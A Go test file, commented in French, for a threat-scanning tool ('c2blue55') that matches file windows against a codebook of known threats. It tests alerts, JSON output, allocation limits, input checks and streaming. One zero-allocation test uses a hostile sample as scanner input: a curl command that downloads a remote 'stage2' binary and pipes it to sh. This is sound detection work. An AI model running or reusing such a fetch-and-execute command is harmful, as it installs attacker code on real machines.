package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/hazyhaar/c2blue55"
	"github.com/hazyhaar/c2blue55/internal/engine"
)

// probeDataDir est la cible réelle de validation imposée au contrat.
func probeDataDir() string {
	return filepath.Join("..", "..", "internal", "probes", "testdata")
}

func TestResolveCoresBounds(t *testing.T) {
	if got := resolveCores(0); got != 1 {
		t.Fatalf("cores 0: got %d, attendu 1", got)
	}
	if got := resolveCores(-8); got != 1 {
		t.Fatalf("cores négatif: got %d, attendu 1", got)
	}
	if got := resolveCores(1 << 20); got != 1 && got > 4096 {
		t.Fatalf("cores hors bornes non écrêté: %d", got)
	}
}

// TestScannerDetectsEnrolledProbeData enrôle les fichiers réels de testdata,
// puis scanne la même cible : chaque fenêtre doit retrouver son entrée à
// distance nulle. Aucune donnée synthétique n'intervient.
func TestScannerDetectsEnrolledProbeData(t *testing.T) {
	target := probeDataDir()
	if _, err := os.Stat(target); err != nil {
		t.Skipf("cible absente: %v", err)
	}
	book := filepath.Join(t.TempDir(), "probes.c2book")

	n, err := runBuild(target, book)
	if err != nil {
		t.Fatalf("runBuild: %v", err)
	}
	if n == 0 {
		t.Fatal("aucune entrée enrôlée")
	}

	var out bytes.Buffer
	metrics, err := runScan(scanConfig{
		bookPath:  book,
		target:    target,
		threshold: 0,
		cores:     2,
		out:       &out,
	})
	if err != nil {
		t.Fatalf("runScan: %v", err)
	}
	if metrics.entries != n {
		t.Fatalf("entrées chargées = %d, attendu %d", metrics.entries, n)
	}
	if metrics.windows != uint64(n) {
		t.Fatalf("fenêtres scannées = %d, attendu %d", metrics.windows, n)
	}
	if metrics.alerts != uint64(n) {
		t.Fatalf("alertes = %d, attendu %d (distance nulle sur cible enrôlée)", metrics.alerts, n)
	}
	if !strings.Contains(out.String(), "ALERT ") {
		t.Fatal("la sortie texte ne contient aucune alerte")
	}
	if metrics.bytes == 0 {
		t.Fatal("aucun octet comptabilisé")
	}
}

// TestScannerJSONLines sont des lignes JSON valides, une par alerte.
func TestScannerJSONLines(t *testing.T) {
	target := probeDataDir()
	if _, err := os.Stat(target); err != nil {
		t.Skipf("cible absente: %v", err)
	}
	book := filepath.Join(t.TempDir(), "probes.c2book")
	if _, err := runBuild(target, book); err != nil {
		t.Fatalf("runBuild: %v", err)
	}

	var out bytes.Buffer
	metrics, err := runScan(scanConfig{
		bookPath:  book,
		target:    target,
		threshold: 0,
		jsonOut:   true,
		cores:     1,
		out:       &out,
	})
	if err != nil {
		t.Fatalf("runScan: %v", err)
	}
	if metrics.alerts == 0 {
		t.Fatal("aucune alerte émise")
	}

	lines := 0
	for line := range strings.SplitSeq(strings.TrimSpace(out.String()), "\n") {
		if line == "" {
			continue
		}
		var a alert
		if err := json.Unmarshal([]byte(line), &a); err != nil {
			t.Fatalf("ligne JSON invalide %q: %v", line, err)
		}
		if a.Path == "" || a.ThreatID == 0 {
			t.Fatalf("alerte incomplète: %+v", a)
		}
		lines++
	}
	if uint64(lines) != metrics.alerts {
		t.Fatalf("lignes JSON = %d, alertes = %d", lines, metrics.alerts)
	}
}

// TestScannerInspectZeroAllocation vérifie que le chemin chaud d'inspection
// (projection, quantification, recherche) n'alloue aucun octet. Le codebook
// construit porte exactement le complément du code de la fenêtre, donc aucune
// alerte n'est émise et l'inspection seule est mesurée.
func TestScannerInspectZeroAllocation(t *testing.T) {
	var ev c2blue55.Event
	ev.Subsystem = c2blue55.SubFile
	ev.Action = c2blue55.ActRead
	copy(ev.Payload[:], "curl http://198.51.100.7/stage2.bin | sh 0123456789abcdef")

	var vec [engine.EmbeddingDim]float32
	var code [bitcodeWords]uint64
	if !engine.ExtractTo(&ev, vec[:]) {
		t.Fatal("extraction refusée")
	}
	engine.Quantize512(vec[:], &code)

	complement := code
	for k := range complement {
		complement[k] = ^complement[k]
	}
	w := &worker{
		book:      engine.NewCodebook([]engine.CodebookEntry{{Bitcode: complement, ThreatID: 1, Severity: engine.SeverityHigh}}),
		threshold: 0,
		ch:        c2blue55.NewChannel(),
	}

	allocs := testing.AllocsPerRun(500, func() {
		w.inspect(&ev, &vec, &code)
	})
	if allocs != 0 {
		t.Fatalf("inspect alloue %g objets par appel, attendu 0 B/op", allocs)
	}
}

func TestScannerRejectsBadInputs(t *testing.T) {
	if _, err := runScan(scanConfig{bookPath: filepath.Join(t.TempDir(), "absent.c2book"), target: t.TempDir(), threshold: 50, out: &bytes.Buffer{}}); err == nil {
		t.Fatal("un codebook absent doit être refusé")
	}
	book := filepath.Join(t.TempDir(), "empty.c2book")
	if err := engine.SaveCodebook(book, nil); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(t.TempDir(), "not-a-dir.txt")
	if err := os.WriteFile(file, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := runScan(scanConfig{bookPath: book, target: file, threshold: 50, out: &bytes.Buffer{}}); err == nil {
		t.Fatal("une cible non-répertoire doit être refusée")
	}

	huge := filepath.Join(t.TempDir(), "huge.c2book")
	fh, err := os.Create(huge)
	if err != nil {
		t.Fatal(err)
	}
	if err := fh.Truncate(maxCodebookBytes + 1); err != nil {
		t.Fatal(err)
	}
	fh.Close()
	if _, err := runScan(scanConfig{bookPath: huge, target: t.TempDir(), threshold: 50, out: &bytes.Buffer{}}); err == nil {
		t.Fatal("un codebook hors borne mémoire doit être refusé")
	}
}

// TestScannerStreamingBoundary valide le streaming à travers les frontières
// de blocs (fichier de 150 Ko dépassant streamBufferSize) sans allocation sur le tas.
func TestScannerStreamingBoundary(t *testing.T) {
	dir := t.TempDir()
	filePath := filepath.Join(dir, "large.txt")

	// 150 Ko de données textuelles
	const fileSize = 150 * 1024
	streamPayload := make([]byte, fileSize)
	for i := range streamPayload {
		if i%80 == 79 {
			streamPayload[i] = '\n'
		} else {
			streamPayload[i] = 'a' + byte(i%26)
		}
	}
	if err := os.WriteFile(filePath, streamPayload, 0o600); err != nil {
		t.Fatalf("écriture large.txt: %v", err)
	}

	bookPath := filepath.Join(dir, "test.c2book")
	if err := engine.SaveCodebook(bookPath, []engine.CodebookEntry{}); err != nil {
		t.Fatalf("SaveCodebook: %v", err)
	}

	m, err := runScan(scanConfig{
		bookPath:  bookPath,
		target:    dir,
		threshold: 0,
		stride:    32,
		cores:     1,
		out:       &bytes.Buffer{},
	})
	if err != nil {
		t.Fatalf("runScan streaming: %v", err)
	}
	if m.bytes != fileSize {
		t.Fatalf("octets scannés = %d, attendu %d", m.bytes, fileSize)
	}

	// Calcul théorique du nombre de fenêtres pour 150 Ko avec windowBytes=96 et stride=32
	expectedWindows := uint64(0)
	for off := 0; off < fileSize; off += 32 {
		expectedWindows++
		if off+windowBytes >= fileSize {
			break
		}
	}
	if m.windows != expectedWindows {
		t.Fatalf("fenêtres scannées = %d, attendu théorique %d", m.windows, expectedWindows)
	}
}

// TestScannerDeterministicAlertOrder vérifie que la sortie est strictement
// ordonnée par chemin et ligne, assurant une reproductibilité bit-à-bit.
func TestScannerDeterministicAlertOrder(t *testing.T) {
	sink := &alertSink{w: &bufio.Writer{}, json: false}
	sink.emit(alert{Path: "b.go", Line: 50, ThreatID: 2, Distance: 5})
	sink.emit(alert{Path: "a.go", Line: 100, ThreatID: 1, Distance: 3})
	sink.emit(alert{Path: "a.go", Line: 20, ThreatID: 3, Distance: 1})

	var buf bytes.Buffer
	sink.w = bufio.NewWriter(&buf)
	sink.flushSorted()

	lines := strings.Split(strings.TrimSpace(buf.String()), "\n")
	if len(lines) != 3 {
		t.Fatalf("nombre de lignes = %d, attendu 3", len(lines))
	}
	if !strings.Contains(lines[0], "a.go:20") {
		t.Fatalf("première alerte attendue a.go:20, obtenu: %s", lines[0])
	}
	if !strings.Contains(lines[1], "a.go:100") {
		t.Fatalf("deuxième alerte attendue a.go:100, obtenu: %s", lines[1])
	}
	if !strings.Contains(lines[2], "b.go:50") {
		t.Fatalf("troisième alerte attendue b.go:50, obtenu: %s", lines[2])
	}
}

// TestScannerNormalizeFlag vérifie le comportement du pré-filtre NormalizeCodeWindow.
func TestScannerNormalizeFlag(t *testing.T) {
	var ev c2blue55.Event
	copy(ev.Payload[:], "int x = 1; // commentaire bruyant sur le code\nint y = 2;")
	var vec [engine.EmbeddingDim]float32
	var code [bitcodeWords]uint64

	wRaw := &worker{normalize: false}
	wNorm := &worker{normalize: true}

	// Avec wNorm, ev.Payload est normalisé avant extraction
	evRaw := ev
	wRaw.inspect(&evRaw, &vec, &code)

	evNorm := ev
	wNorm.inspect(&evNorm, &vec, &code)

	if bytes.Equal(evRaw.Payload[:], evNorm.Payload[:]) {
		t.Fatalf("l'option normalize n'a pas modifié la charge utile: %q vs %q", evRaw.Payload[:30], evNorm.Payload[:30])
	}
	if !strings.HasPrefix(string(evNorm.Payload[:]), "int x = 1; int y = 2;") {
		t.Fatalf("charge utile normalisée inattendue: %q", string(evNorm.Payload[:]))
	}
}
